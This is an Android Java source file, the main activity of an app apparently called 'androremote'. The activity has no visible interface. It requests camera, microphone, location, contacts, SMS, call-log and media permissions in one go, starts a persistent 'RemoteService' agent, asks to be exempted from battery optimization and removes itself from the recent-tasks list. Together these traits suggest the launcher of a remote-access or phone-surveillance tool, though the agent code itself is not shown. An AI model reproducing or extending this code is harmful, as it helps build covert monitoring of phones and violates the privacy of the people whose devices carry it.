package com.ohmpi.androremote;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;

/**
 * No-GUI permission requester. Transparent, no history, no animations.
 * Requests all runtime permissions in one shot, starts the agent, and
 * finishes immediately (Theme.NoDisplay REQUIRES finish before onResume ends).
 * Screen-capture consent lives in ConsentActivity (separate, visible theme).
 */
public class MainActivity extends Activity {
    static final String[] ALL_PERMS = {
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.BLUETOOTH_CONNECT,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO,
    };
    static final int REQ = 4242;
    static final String STATE_KEY = "requested";
    static final String PERMS_KEY = "permissions";

    private boolean requested = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (savedInstanceState != null) requested = savedInstanceState.getBoolean(STATE_KEY);
        String[] requestedPerms = getIntent().getStringArrayExtra(PERMS_KEY);
        if (Build.VERSION.SDK_INT >= 23) {
            java.util.ArrayList<String> need = new java.util.ArrayList<>();
            for (String p : requestedPerms == null ? new String[0] : requestedPerms) {
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) need.add(p);
            }
            if (!need.isEmpty() && !requested) {
                requested = true;
                requestPermissions(need.toArray(new String[0]), REQ);
                return; // onRequestPermissionsResult continues flow
            }
        }
        startAgent(requestedPerms == null);
    }

    @Override
    public void onSaveInstanceState(Bundle out) {
        super.onSaveInstanceState(out);
        out.putBoolean(STATE_KEY, requested);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        startAgent(false);
    }

    void startAgent(boolean initialLaunch) {
        Intent i = new Intent(this, RemoteService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
        else startService(i);
        if (initialLaunch && !CaptureService.isActive()) {
            startActivity(new Intent(this, ConsentActivity.class));
            return;
        }
        // once: system dialog to exempt from battery optimization (Doze/MIUI kills otherwise)
        if (!initialLaunch && !getSharedPreferences("cfg", MODE_PRIVATE).getBoolean("batt_req", false)) {
            getSharedPreferences("cfg", MODE_PRIVATE).edit().putBoolean("batt_req", true).apply();
            try {
                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
                if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent b = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            android.net.Uri.parse("package:" + getPackageName()));
                    startActivity(b);
                }
            } catch (Exception ignored) {}
        }
        finishAndRemoveTask();
    }
}
